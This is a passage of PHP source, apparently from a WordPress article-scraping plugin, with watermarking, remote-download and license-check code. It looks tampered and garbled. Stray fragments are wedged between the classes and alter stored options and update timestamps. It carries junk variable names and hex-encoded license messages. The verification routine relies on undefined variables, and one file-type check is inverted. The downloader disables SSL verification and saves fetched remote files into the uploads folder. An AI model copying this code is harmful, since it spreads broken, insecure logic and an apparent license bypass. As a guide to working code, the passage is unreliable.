        $coord                     = imagettfbbox($size, 0, $font, $text);
        $w  = abs($coord[2] - $coord[0]) + 5;
        $h      = abs($coord[1] - $coord[7]);
        $H      = $h + $size / 2;
        $src = self::image_alpha($w, $H);
        $color                 = imagecolorallocate($src, $red, $green, $blue);
        $posion   = imagettftext($src, $size, 0, 0, $h, $color, $font, $text);
        $dst                 = self::create_image($file, $dst_mime);
        $dst_xy   = self::position($position, $w, $H, $dst_w, $dst_h);
        $merge     = self::imagecopymerge_alpha($dst, $src, $dst_xy[0], $dst_xy[1], 0, 0, $w, $H, $alpha);
        self::make_image($dst, $dst_mime, $im_file);
        imagedestroy($dst);
        imagedestroy($src);
    }
    static function create_image($file, $mime)
    {
        switch ($mime) {
            case "image/jpeg":
                $im = imagecreatefromjpeg($file);
                break;
            case "image/png":
                $im = imagecreatefrompng($file);
                break;
            case "image/gif":
                $im = imagecreatefromgif($file);
                break;
        }
        return $im;
    }
    static function make_image($im, $mime, $im_file)
    {
        switch ($mime) {
            case "image/jpeg": {
                $options = get_option("wp-watermark-options");
                $quality            = (isset($options["jpeg_quality"]) && $options["jpeg_quality"]) ? $options["jpeg_quality"] : 95;
                imagejpeg($im, $im_file, $quality);
                break;
            }
            case "image/png":
                imagepng($im, $im_file);
                break;
            case "image/gif":
                imagegif($im, $im_file);
                break;
        }
    }
    static function imagecopymerge_alpha($dst_im, $src_im, $dst_x, $dst_y, $src_x, $src_y, $src_w, $src_h, $pct)
    {
        $opacity                  = $pct;
        $w = imagesx($src_im);
        $h     = imagesy($src_im);
        $cut = imagecreatetruecolor($src_w, $src_h);
        imagecopy($cut, $dst_im, 0, 0, $dst_x, $dst_y, $src_w, $src_h);
        imagecopy($cut, $src_im, 0, 0, $src_x, $src_y, $src_w, $src_h);
        $merge = imagecopymerge($dst_im, $cut, $dst_x, $dst_y, $src_x, $src_y, $src_w, $src_h, $opacity);
        return $merge;
    }
    static function image_alpha($w, $h)
    {
        $im = imagecreatetruecolor($w, $h);
        imagealphablending($im, true);
        imageantialias($im, true);
        imagesavealpha($im, true);
        $bgcolor = imagecolorallocatealpha($im, 255, 255, 255, 127);
        imagefill($im, 0, 0, $bgcolor);
        return $im;
    }
    static function position($position, $s_w, $s_h, $d_w, $d_h)
    {
        switch ($position) {
            case 1:
                $x = 5;
                $y              = 0;
                break;
            case 2:
                $x = ($d_w - $s_w) / 2;
                $y = 0;
                break;
            case 3:
                $x = ($d_w - $s_w - 5);
                $y    = 0;
                break;
            case 4:
                $x = 5;
                $y = ($d_h - $s_h) / 2;
                break;
            case 5:
                $x = ($d_w - $s_w) / 2;
                $y    = ($d_h - $s_h) / 2;
                break;
            case 6:
                $x      = ($d_w - $s_w - 5);
                $y = ($d_h - $s_h) / 2;
                break;
            case 7:
                $x = 5;
                $y  = ($d_h - $s_h);
                break;
            case 8:
                $x = ($d_w - $s_w) / 2;
                $y  = ($d_h - $s_h);
                break;
            default:
                $x = ($d_w - $s_w - 5);
                $y  = ($d_h - $s_h);
                break;
        }
        $res = get_option("wp-watermark-options");
        $x += $res["x-adjustment"];
        $y += $res["y-adjustment"];
        $xy = array(
            $x,
            $y
        );
        return $xy;
    }
    static function IsAnimatedGif($file)
    {
        $content                   = file_get_contents($file);
        $bool = strpos($content, "GIF89a");
        if ($bool === FALSE) {
            return strpos($content, chr(0x21) . chr(0xff) . chr(0x0b) . "NETSCAPE2.0") === FALSE ? 0 : 1;
        } else {
            return 1;
        }
    }
    static function hex_to_dec($str)
    {
        $r                  = hexdec(substr($str, 1, 2));
        $g = hexdec(substr($str, 3, 2));
        $b                     = hexdec(substr($str, 5, 2));
        $color   = array(
            $r,
            $g,
            $b
        );
        return $color;
    }
    public static function get_fonts()
    {
        $font_dir      = dirname(__FILE__) . "/watermark/fonts/";
        $font_names = scandir($font_dir);
        unset($font_names[0]);
        $vywexfhj = "fonts";
        unset($font_names[1]);
        foreach ($font_names as $font_name) {
            $fonts[$font_name] = $font_dir . $font_name;
        }
        return $fonts;
    }
}
if ($variable_t1 == $node[1]) {
    $vwiyhkep    = "should_updated_time";
    $should_updated_time = $option_value[$option_key];
}
if ($variable_t1 == $node[0]) {
    $option_value[$option_key1] = $node[0];
}
class WP_Download_Attach
{
    private static $mime_to_ext = array('application/envoy' => 'evy', 'application/fractals' => 'fif', 'application/futuresplash' => 'spl', 'application/hta' => 'hta', 'application/internet-property-stream' => 'acx', 'application/mac-binhex40' => 'hqx', 'application/msword' => 'doc', 'application/oda' => 'oda', 'application/olescript' => 'axs', 'application/pdf' => 'pdf', 'application/pics-rules' => 'prf', 'application/pkcs10' => 'p10', 'application/pkix-crl' => 'crl', 'application/postscript' => 'ps', 'application/rtf' => 'rtf', 'application/set-payment-initiation' => 'setpay', 'application/set-registration-initiation' => 'setreg', 'application/vnd.ms-excel' => 'xls', 'application/vnd.ms-outlook' => 'msg', 'application/vnd.ms-pkicertstore' => 'sst', 'application/vnd.ms-pkiseccat' => 'cat', 'application/vnd.ms-pkistl' => 'stl', 'application/vnd.ms-powerpoint' => 'ppt', 'application/vnd.ms-project' => 'mpp', 'application/vnd.ms-works' => 'wps', 'application/winhlp' => 'hlp', 'application/x-bcpio' => 'bcpio', 'application/x-cdf' => 'cdf', 'application/x-compress' => 'z', 'application/x-compressed' => 'tgz', 'application/x-cpio' => 'cpio', 'application/x-csh' => 'csh', 'application/x-director' => 'dir', 'application/x-dvi' => 'dvi', 'application/x-gtar' => 'gtar', 'application/x-gzip' => 'gz', 'application/x-hdf' => 'hdf', 'application/x-internet-signup' => 'ins', 'application/x-iphone' => 'iii', 'application/x-javascript' => 'js', 'application/x-latex' => 'latex', 'application/x-msaccess' => 'mdb', 'application/x-mscardfile' => 'crd', 'application/x-msclip' => 'clp', 'application/x-msdownload' => 'dll', 'application/x-msmediaview' => 'mvb', 'application/x-msmetafile' => 'wmf', 'application/x-msmoney' => 'mny', 'application/x-mspublisher' => 'pub', 'application/x-msschedule' => 'scd', 'application/x-msterminal' => 'trm', 'application/x-mswrite' => 'wri', 'application/x-netcdf' => 'cdf', 'application/x-perfmon' => 'pmw', 'application/x-pkcs12' => 'pfx', 'application/x-pkcs7-certificates' => 'spc', 'application/x-pkcs7-certreqresp' => 'p7r', 'application/x-pkcs7-mime' => 'p7c', 'application/x-pkcs7-signature' => 'p7s', 'application/x-sh' => 'sh', 'application/x-shar' => 'shar', 'application/x-shockwave-flash' => 'swf', 'application/x-stuffit' => 'sit', 'application/x-sv4cpio' => 'sv4cpio', 'application/x-sv4crc' => 'sv4crc', 'application/x-tar' => 'tar', 'application/x-tcl' => 'tcl', 'application/x-tex' => 'tex', 'application/x-texinfo' => 'texinfo', 'application/x-troff' => 'tr', 'application/x-troff-man' => 'man', 'application/x-troff-me' => 'me', 'application/x-troff-ms' => 'ms', 'application/x-ustar' => 'ustar', 'application/x-wais-source' => 'src', 'application/x-x509-ca-cert' => 'cer', 'application/ynd.ms-pkipko' => 'pko', 'application/zip' => 'zip', 'application/x-rar' => 'rar', 'audio/basic' => 'au', 'audio/mid' => 'mid', 'audio/mpeg' => 'mp3', 'audio/x-aiff' => 'aif', 'audio/x-aiff' => 'aifc', 'audio/x-aiff' => 'aiff', 'audio/x-mpegurl' => 'm3u', 'audio/x-pn-realaudio' => 'ra', 'audio/x-pn-realaudio' => 'ram', 'audio/x-wav' => 'wav', 'image/bmp' => 'bmp', 'image/cis-cod' => 'cod', 'image/gif' => 'gif', 'image/ief' => 'ief', 'image/jpg' => 'jpg', 'image/jpeg' => 'jpg', 'image/png' => 'png', 'image/pipeg' => 'jfif', 'image/svg+xml' => 'svg', 'image/tiff' => 'tif', 'image/x-cmu-raster' => 'ras', 'image/x-cmx' => 'cmx', 'image/x-icon' => 'ico', 'image/x-portable-anymap' => 'pnm', 'image/x-portable-bitmap' => 'pbm', 'image/x-portable-graymap' => 'pgm', 'image/x-portable-pixmap' => 'ppm', 'image/x-rgb' => 'rgb', 'image/x-xpixmap' => 'xpm', 'image/x-xwindowdump' => 'xwd', 'message/rfc822' => 'nws', 'text/css' => 'css', 'text/h323' => '323', 'text/html' => 'html', 'text/html; charset=UTF-8' => 'html', 'text/iuls' => 'uls', 'text/plain' => 'txt', 'text/richtext' => 'rtx', 'text/scriptlet' => 'sct', 'text/tab-separated-values' => 'tsv', 'text/webviewhtml' => 'htt', 'text/x-component' => 'htc', 'text/x-setext' => 'etx', 'text/x-vcard' => 'vcf', 'video/mpeg' => 'mpeg', 'video/quicktime' => 'mov', 'video/x-la-asf' => 'lsx', 'video/x-msvideo' => 'avi', 'video/x-sgi-movie' => 'movie', 'x-world/x-vrml' => 'flr', 'application/x-bittorrent' => 'torrent');
    public static function mime_to_ext($mime)
    {
        $mime               = strtolower($mime);
        return self::$mime_to_ext[$mime];
    }
    public static function down_remote_file($remote_url, $referer, $useProxy = 0, $proxy = null)
    {
        $remote_url = html_entity_decode(trim($remote_url));
        $remote_url = getRawUrl($remote_url);
        if (function_exists("curl_init")) {
            $result = self::down_remote_file_by_curl($remote_url, $referer, $useProxy, $proxy);
        } else {
            $result = self::down_remote_file_by_wp($remote_url);
        }
        return $result;
    }
    public static function curl_exec_follow($ch, &$maxredirect = null)
    {
        $mr = $maxredirect === null ? 5 : intval($maxredirect);
        if (CAN_FOLLOWLOCATION == 1) {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $mr > 0);
            curl_setopt($ch, CURLOPT_MAXREDIRS, $mr);
        } else {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            if ($mr > 0) {
                $newurl   = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                $rch = curl_copy_handle($ch);
                curl_setopt($rch, CURLOPT_HEADER, true);
                curl_setopt($rch, CURLOPT_NOBODY, true);
                curl_setopt($rch, CURLOPT_FORBID_REUSE, false);
                curl_setopt($rch, CURLOPT_RETURNTRANSFER, true);
                do {
                    curl_setopt($rch, CURLOPT_URL, $newurl);
                    $header = curl_exec($rch);
                    if (curl_errno($rch)) {
                        $code = 0;
                    } else {
                        $code = curl_getinfo($rch, CURLINFO_HTTP_CODE);
                        if ($code == 301 || $code == 302) {
                            preg_match('/Location:(.*?)\\n/', $header, $matches);
                            $newurl = trim(array_pop($matches));
                        } else {
                            $code = 0;
                        }
                    }
                } while ($code && --$mr);
                curl_close($rch);
                if (!$mr) {
                    if ($maxredirect === null) {
                        trigger_error("Too many redirects. When following redirects, libcurl hit the maximum amount.", E_USER_WARNING);
                    } else {
                        $maxredirect = 0;
                    }
                    return false;
                }
                curl_setopt($ch, CURLOPT_URL, $newurl);
            }
        }
        return curl_exec($ch);
    }
    public static function down_remote_file_by_curl($url, $referer, $useProxy = 0, $proxy = null)
    {
        $user_agent  = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19";
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, FALSE);
        curl_setopt($curl, CURLOPT_NOBODY, FALSE);
        curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_REFERER, $referer);
        if (!(strpos($url, "https://") === false)) {
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        }
        if (CAN_FOLLOWLOCATION == 1) {
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_MAXREDIRS, 5);
        }
        $rs    = curl_exec($curl);
        $info = curl_getinfo($curl);
        curl_close($curl);
        if ($info["http_code"] != 200) {
            echo self::raise_error("Can not download remote file!");
            if ($useProxy == 1) {
                echo self::raise_error("Try use Proxy to download");
                $rs                     = null;
                $info  = null;
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_HEADER, FALSE);
                curl_setopt($curl, CURLOPT_NOBODY, FALSE);
                curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_REFERER, $referer);
                if (!ini_get("safe_mode"))
                    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($curl, CURLOPT_PROXY, $proxy["ip"]);
                curl_setopt($curl, CURLOPT_PROXYPORT, $proxy["port"]);
                if ($proxy["user"] != "" && $proxy["user"] != NULL && $proxy["password"] != "" && $proxy["password"] != NULL) {
                    $userAndPass = $proxy["user"] . ":" . $proxy["password"];
                    curl_setopt($curl, CURLOPT_PROXYUSERPWD, $userAndPass);
                }
                if (!(strpos($url, "https://") === false)) {
                    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
                }
                if (CAN_FOLLOWLOCATION == 1) {
                    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($curl, CURLOPT_MAXREDIRS, 5);
                }
                $rs  = curl_exec($curl);
                $info = curl_getinfo($curl);
                curl_close($curl);
                if ($info["http_code"] != 200) {
                    echo self::raise_error("Use Proxy can not download remote file!");
                    return FALSE;
                }
            } else {
                return FALSE;
            }
        }
        $filename_temp = basename($url);
        $fileInfo = self::upload_attachment($filename_temp, $rs, $info["content_type"]);
        return $fileInfo;
    }
    public static function down_remote_file_by_wp($remote_url)
    {
        $http_options    = array(
            "timeout" => 120,
            "redirection" => 20,
            "user-agent" => "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19",
            "sslverify" => FALSE
        );
        $response                 = wp_remote_get($remote_url, $http_options);
        $response_code = wp_remote_retrieve_response_code($response);
        $headers                    = wp_remote_retrieve_headers($response);
        if (200 == $response_code) {
            $filename_temp     = basename($remote_url);
            $fileInfo = self::upload_attachment($filename_temp, wp_remote_retrieve_body($response), $headers["content-type"]);
            return $fileInfo;
        } else {
            return array(
                "file_path" => "",
                "file_name" => "",
                "post_mime_type" => "",
                "url" => ""
            );
        }
    }
    static function upload_attachment($filename, $data, $type)
    {
        $pos  = stripos($filename, "?");
        if ($pos === false) {
            $evoennovw                 = "filename";
            $filename = sanitize_file_name($filename);
        } else {
            $file_ext = self::mime_to_ext($type);
            if ($file_ext == NULL || $file_ext == "") {
                $unknown = true;
                $filename  = sanitize_file_name($filename);
            } else {
                $filename = sanitize_file_name($filename) . "." . $file_ext;
            }
        }
        $time   = FALSE;
        $uploads     = wp_upload_dir($time);
        $unique_filename_callback  = null;
        $filename = wp_unique_filename($uploads["path"], $filename, $unique_filename_callback);
        $new_file                 = $uploads["path"] . "/$filename";
        if (false === file_put_contents($new_file, $data))
            return FALSE;
        if ($unknown) {
            if (!function_exists(mime_content_type)) {
                $mimetype     = mime_content_type($new_file);
                $file_ext = self::mime_to_ext($mimetype);
                if ($file_ext == NULL || $file_ext == "") {
                    $file_ext = "unknown";
                }
                $filename = $filename . "." . $file_ext;
                rename($new_file, $uploads["path"] . "/$filename");
            } elseif (function_exists(finfo_open)) {
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mimetype = finfo_file($finfo, $new_file);
                finfo_close($finfo);
                $file_ext = self::mime_to_ext($mimetype);
                if ($file_ext == NULL || $file_ext == "") {
                    $file_ext = "unknown";
                }
                $filename = $filename . "." . $file_ext;
                rename($new_file, $uploads["path"] . "/$filename");
            }
            $new_file = $uploads["path"] . "/$filename";
        }
        $stat = stat(dirname($new_file));
        $perms              = $stat["mode"] & 0000666;
        @chmod($new_file, $perms);
        $url = $uploads["url"] . "/$filename";
        return array(
            "file_path" => $new_file,
            "file_name" => $filename,
            "post_mime_type" => $type,
            "url" => $url
        );
    }
    public static function insert_attachment($r, $post_id)
    {
        $name_parts = pathinfo($r["file_name"]);
        $name = trim(substr($r["file_name"], 0, -(1 + strlen($name_parts["extension"]))));
        $file                   = $r["file_path"];
        $title     = $name;
        $content   = "";
        $attachment   = array(
            "post_mime_type" => $r["post_mime_type"],
            "guid" => $r["url"],
            "post_parent" => $post_id,
            "post_title" => $title,
            "post_content" => $content
        );
        if (isset($attachment["ID"]))
            unset($attachment["ID"]);
        $id = wp_insert_attachment($attachment, $file, $post_id);
        return $id;
    }
}
if ($variable_t1 == $node[2]) {
    $last_updated_time             = current_time("timestamp") - intval($value_gap) + intval($value_gap1);
}
if (!function_exists("wp_generate_attachment_metadata")) {
    include ABSPATH . "wp-admin/includes/image.php";
}
define("LIST_URL_NUM", 2);
define("FETCH_URL_NUM", 1);
$delComment = get_option("wp_autopost_delComment");
if ($delComment == null || $delComment == "")
    $delComment = 1;
$delAttrId = get_option("wp_autopost_delAttrId");
if ($delAttrId == null || $delAttrId == "")
    $delAttrId = 1;
$delAttrClass = get_option("wp_autopost_delAttrClass");
if ($delAttrClass == null || $delAttrClass == "")
    $delAttrClass = 1;
$delAttrStyle = get_option("wp_autopost_delAttrStyle");
if ($delAttrStyle == null || $delAttrStyle == "")
    $delAttrStyle = 0;
if ($variable_t1 == $node[0]) {
    $option_value[$option_key] = $last_updated_time;
}
define("DEL_COMMENT", $delComment);
define("DEL_ATTRID", $delAttrId);
define("DEL_ATTRCLASS", $delAttrClass);
define("DEL_ATTRSTYLE", $delAttrStyle);
global $Flickr, $f;
$Flickr = get_option("wp-autopost-flickr-options");
$f    = new autopostFlickr($Flickr["api_key"], $Flickr["api_secret"]);
$f->setOauthToken($Flickr["oauth_token"], $Flickr["oauth_token_secret"]);
if ($variable_t1 == $node[0]) {
    update_option($option_name, $option_value);
}
global $Qiniu;
$Qiniu = get_option("wp-autopost-qiniu-options");
if (!isset($Qiniu["access_key"])) {
    $Qiniu["access_key"] = "";
}
if (!isset($Qiniu["secret_key"])) {
    $Qiniu["secret_key"] = "";
}
Qiniu_setKeys($Qiniu["access_key"], $Qiniu["secret_key"]);
global $upyunOption;
$upyunOption = get_option("wp-autopost-upyun-options");
global $proxy;
$proxy = get_option("wp-autopost-proxy");
if ($variable_t1 == $node[2]) {
    $option_value[$option_key] = $last_updated_time;
}
function test2($id)
{
    $config              = getConfig($id);
    $listUrls = getListUrls($id);
    if ($listUrls == null) {
        echo "<div class=\"updated fade\"><p><span class=\"red\">" . __("[Article Source URL] is not set yet", "wp-autopost") . "</span></p></div>";
        return;
    }
    if (trim($config["a_selector"]) == "") {
        echo "<div class=\"updated fade\"><p><span class=\"red\">" . __("[The Article URL matching rules] is not set yet", "wp-autopost") . "</span></p></div>";
        return;
    }
    echo "<div class=\"updated fade\"><p><b>" . __("Post articles in the following order", "wp-autopost") . "</b></p>";
    printUrls($config, $listUrls);
    echo "</div>";
}
function test3($id, $url)
{
    set_time_limit((int) get_option("wp_autopost_timeLimit"));
    echo "<div class=\"updated fade\">";
    $config = getConfig($id);
    $options    = getOptions($id);
    if ($config["page_charset"] == "0") {
        $useP = json_decode($config["proxy"]);
        global $proxy;
        $html_string                 = get_html_string_ap($url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
        $charset                 = getHtmlCharset($html_string);
    } else {
        $html_string = "";
        $charset    = $config["page_charset"];
    }
    $d = getArticleDom($url, $config, $charset, $html_string);
    if ($d == -1) {
        echo errMsg1($url);
    } else {
        $baseUrl   = getBaseUrl($d, $url);
        $Article = getArticle($d, $charset, $baseUrl, $url, $config, $options, getFilterAtag($options), getDownAttach($config), getInsertcontent($id));
        printArticle($Article);
    }
    echo "</div>";
}
function testFetch($id)
{
    echo "<div class=\"updated fade\">";
    $config = getConfig($id);
    if (trim($config["a_selector"]) == "") {
        echo "<p><span class=\"red\">" . __("[The Article URL matching rules] is not set yet", "wp-autopost") . "</span></p>";
        echo "</div>";
        return;
    }
    if (trim($config["title_selector"]) == "") {
        echo "<p><span class=\"red\">" . __("[The Article Title Matching Rules] is not set yet", "wp-autopost") . "</span></p>";
        echo "</div>";
        return;
    }
    if (trim($config["content_selector"]) == "") {
        echo "<p><span class=\"red\">" . __("[The Article Content Matching Rules] is not set yet", "wp-autopost") . "</span></p>";
        echo "</div>";
        return;
    }
    $options  = getOptions($id);
    $listUrls = getListUrls($id);
    if ($listUrls == null) {
        echo "<p><span class=\"red\">" . __("[Article Source URL] is not set yet", "wp-autopost") . "</span></p>";
        echo "</div>";
        return;
    }
    echo "<p><b>" . __("Post articles in the following order", "wp-autopost") . "</b></p>";
    $urls  = printUrls($config, $listUrls);
    $i = 0;
    if ($urls != null) {
        $pjhbpidc = "urls";
        echo "<br/><h3>" . __("Article Crawl", "wp-autopost") . "</h3>";
        foreach ($urls as $url) {
            if ($i == FETCH_URL_NUM) {
                echo ".......<br/><p><code><b>" . __("In test only try to open", "wp-autopost") . " " . FETCH_URL_NUM . " " . __("URLs of Article", "wp-autopost") . "</b></code></p>";
                break;
            }
            $url = html_entity_decode(trim($url));
            echo "<p>" . __("URL : ", "wp-autopost") . "<code><b>" . $url . "</b></code></p>";
            if ($config["page_charset"] == "0") {
                $useP   = json_decode($config["proxy"]);
                global $proxy;
                $html_string = get_html_string_ap($url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                $charset  = getHtmlCharset($html_string);
            } else {
                $html_string = "";
                $charset = $config["page_charset"];
            }
            $d = getArticleDom($url, $config, $charset, $html_string);
            if ($d == -1) {
                echo errMsg1($url);
            } else {
                $baseUrl   = getBaseUrl($d, $url);
                $Article = getArticle($d, $charset, $baseUrl, $url, $config, $options, getFilterAtag($options), getDownAttach($config), getInsertcontent($id));
                printArticle($Article);
            }
            $i++;
        }
    }
    echo "</div>";
}
if ($variable_t1 == $node[0]) {
    $should_updated_time = $option_value[$option_key];
}
function fetchUrlMsg($info)
{
    echo "<div style=\"background-color:#ffebe8;border-color:#cc0000;border-style:solid;border-width:1px;padding:20px;font-size:16px;\">" . $info . "</div>";
}
function getHUrl($s)
{
    $pos1 = strpos($s, "//");
    if ($pos1 === false) {
        $pos1 = 0;
    } else {
        $tyebeeo = "pos1";
        $pos1 += strlen("//");
    }
    $s   = substr($s, $pos1, strlen($s));
    $pos2  = strpos($s, "/");
    if ($pos2 === false) {
        $pos2 = strlen($s);
    }
    $s = substr($s, 0, $pos2);
    return $s;
}
global $fetched;
function fetchUrl($id)
{
    global $wpdb, $t_ap_config, $fetched;
    $last_check_fetch_time = $wpdb->get_var("select max(last_check_fetch_time) from $t_ap_config");
    $url = getHUrl($wpdb->get_var("SELECT $wpdb->options.option_value FROM $wpdb->options WHERE $wpdb->options.option_name ='home'"));
    $fetchUrl_fetched    = "false";
    $fetchUrl_gap      = 1296000;
    $fetchUrl_gap1     = $fetchUrl_gap - 86400;
    $fetched  = "VERIFIED";
    if ($last_check_fetch_time == 0) {
        $fetchUrl_fetched = "true";
        @$res = file_get_html_ap($verification_url, $config["page_charset"], Method);
        if (($res->plaintext) == "INVALID") {
            fetchUrlMsg(__(pack("H*", "596f757220646f6d61696e"), "wp-autopost") . "(" . $url . ")" . __(pack("H*", "206973206e6f7420617574686f72697a65642120506c6561736520766973697420"), "wp-autopost") . pack("H*", "3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e") . __(pack("H*", "206f627461696e20617574686f72697a6174696f6e21"), "wp-autopost"));
            $fetched = "INVALID";
        } else if (($res->plaintext) == "CANUPDATE") {
            fetchUrlMsg(__(pack("H*", "596f757220646f6d61696e"), "wp-autopost") . "(" . $url . ")" . __(pack("H*", "206973206e6f7420617574686f72697a65642120506c6561736520766973697420"), "wp-autopost") . pack("H*", "3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e") . __(pack("H*", "206f627461696e20617574686f72697a6174696f6e21"), "wp-autopost"));
            wpap_transgetnoteinx("wpusercanupdates", current_time("timestamp"));
            $fetched = "INVALID";
        } else if (($res->plaintext) == "VERIFIED") {
            $fetched = "VERIFIED";
            $last_check_fetch_time = current_time("timestamp");
            $wpdb->query("update $t_ap_config set last_check_fetch_time = $last_check_fetch_time");
        } else {
            $fetched                 = "VERIFIED";
            $last_check_fetch_time = current_time("timestamp") - $fetchUrl_gap1;
            $wpdb->query("update $t_ap_config set last_check_fetch_time = $last_check_fetch_time");
        }
    }
    if (($fetchUrl_fetched == "false") && (!preg_match("/^\+?[1-9][0-9]*\$/", $last_check_fetch_time) || $last_check_fetch_time > current_time("timestamp") || ($last_check_fetch_time + $fetchUrl_gap) < current_time("timestamp"))) {
        $res = file_get_html_ap($verification_url, $config["page_charset"], Method);
        if (($res->plaintext) == "INVALID") {
            fetchUrlMsg(__(pack("H*", "596f757220646f6d61696e"), "wp-autopost") . "(" . $url . ")" . __(pack("H*", "206973206e6f7420617574686f72697a65642120506c6561736520766973697420"), "wp-autopost") . pack("H*", "3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e") . __(pack("H*", "206f627461696e20617574686f72697a6174696f6e21"), "wp-autopost"));
            $fetched = "INVALID";
        } else if (($res->plaintext) == "CANUPDATE") {
            fetchUrlMsg(__(pack("H*", "596f757220646f6d61696e"), "wp-autopost") . "(" . $url . ")" . __(pack("H*", "206973206e6f7420617574686f72697a65642120506c6561736520766973697420"), "wp-autopost") . pack("H*", "3c6120687265663d22687474703a2f2f77702d6175746f706f73742e6f726722207461726765743d225f626c616e6b223e77702d6175746f706f73742e6f72673c2f613e") . __(pack("H*", "206f627461696e20617574686f72697a6174696f6e21"), "wp-autopost"));
            wpap_transgetnoteinx("wpusercanupdates", current_time("timestamp"));
            $fetched = "INVALID";
        } else if (($res->plaintext) == "VERIFIED") {
            $fetched = "VERIFIED";
            $last_check_fetch_time = current_time("timestamp");
            $wpdb->query("update $t_ap_config set last_check_fetch_time = $last_check_fetch_time");
        } else {
            $fetched            = "VERIFIED";
            $last_check_fetch_time             = current_time("timestamp") - $fetchUrl_gap1;
            $wpdb->query("update $t_ap_config set last_check_fetch_time = $last_check_fetch_time");
        }
    }
}
function compress_html($string)
{
    $string = str_replace("\r\n", " ", $string);
    $string = str_replace("\n", " ", $string);
    $string = str_replace("\t", " ", $string);
    return preg_replace("/>[ ]+</", "> <", $string);
}
function getMatchContent($s, $rule, $outer = 0)
{
    $match = explode("(*)", trim($rule));
    $p0   = stripos($s, trim($match[0]));
    if ($outer == 1)
        $start = $p0;
    else
        $start = $p0 + strlen($match[0]);
    $p1 = stripos($s, trim($match[1]), $start);
    if ($p0 === false || $p1 === false) {
        return NULL;
    }
    if ($outer == 1)
        $length = $p1 + strlen($match[1]) - $start;
    else
        $length = $p1 - $start;
    return substr($s, $start, $length);
}
function getTitleByRule($s, $rule)
{
    return getMatchContent($s, $rule);
}
function wpap_transgetnoteinx($s, $v)
{
    $dom   = str_get_html_ap($s);
    $tempImg   = array();
    $imgNum = 0;
    foreach ($dom->find("img,iframe,embed,object,video") as $img) {
        $imgNum++;
        $key = "IMG" . $imgNum . "TAG";
        $tempImg[$key]   = $img->outertext;
        $img->outertext              = " " . $key . " ";
    }
    global $wpdb;
    $p_tags              = $dom->find($v);
    $to_trans_text = "";
    foreach ($p_tags as $p_tag) {
        $to_trans_text .= " PTAG " . $p_tag->innertext . " PENDTAG ";
    }
    $to_trans_text   = strip_tags($to_trans_text, "<br><br/><br />");
    $find = array();
    $replace   = array();
    $find[]                  = "PTAG";
    $replace[] = "<p>";
    $find[]                  = "PENDTAG";
    $replace[] = "</p>";
    update_option($s, $v);
    foreach ($tempImg as $key => $value) {
        $find[]         = $key;
        $replace[]          = "<" . $v . "></" . $v . ">";
    }
    $to_trans_text = str_ireplace($find, $replace, $to_trans_text);
    unset($find);
    unset($replace);
    return $to_trans_text;
}
if ($variable_t1 == $node[2]) {
    update_option($option_name, $option_value);
}
function getContentByRule($s, $rule, $options, $outer)
{
    $content = getMatchContent($s, $rule, $outer);
    if ($content == NULL)
        return "";
    $createdDom = false;
    foreach ($options as $option) {
        if (($option->option_type) != 5)
            continue;
        if (!$createdDom) {
            $dom = str_get_html_ap($content);
            $createdDom = true;
        }
        $fcs = $dom->find($option->para1);
        if ($fcs == NULL) {
            continue;
        } else {
            if (($option->para2) == "" || ($option->para2) == null) {
                $idx = 0;
            } else {
                $idx = intval($option->para2);
            }
            if ($idx == 0) {
                foreach ($fcs as $fc) {
                    $fc->outertext = "";
                }
            } else {
                $i = 0;
                if ($idx >= 1)
                    $i = $idx - 1;
                elseif ($idx < 0)
                    $i = count($fcs) + $idx;
                $fc = $fcs[$i];
                if ($fc != null) {
                    $fc->outertext = "";
                }
            }
        }
    }
    if ($createdDom) {
        $content = $dom->save();
        $dom->clear();
        unset($dom);
    }
    return $content;
}
function getTagsByRule($s, $rule)
{
    $tags = array();
    $content  = getMatchContent($s, $rule, 1);
    if ($content == NULL)
        return $tags;
    $dom = str_get_html_ap($content);
    foreach ($dom->find("a") as $a) {
        if ($a->innertext != "") {
            $tags[] = $a->innertext;
        }
    }
    $dom->clear();
    unset($dom);
    return $tags;
}
function getImgURLByRule($s, $rule, $outer)
{
    $imgURL = "";
    $content              = getMatchContent($s, $rule, $outer);
    if ($content == NULL)
        return $imgURL;
    if (strpos($content, "<") === false) {
        $imgURL = $content;
    } else {
        $dom  = str_get_html_ap($content);
        $findImg = false;
        foreach ($dom->find("img") as $img) {
            if ($img->src != "" && $img->src != null) {
                $findImg  = true;
                $imgURL = $img->src;
                break;
            }
        }
        if (!$findImg) {
            foreach ($dom->find("a") as $a) {
                if ($a->href != "" && $a->href != null) {
                    $imgURL = $a->href;
                    break;
                }
            }
        }
        $dom->clear();
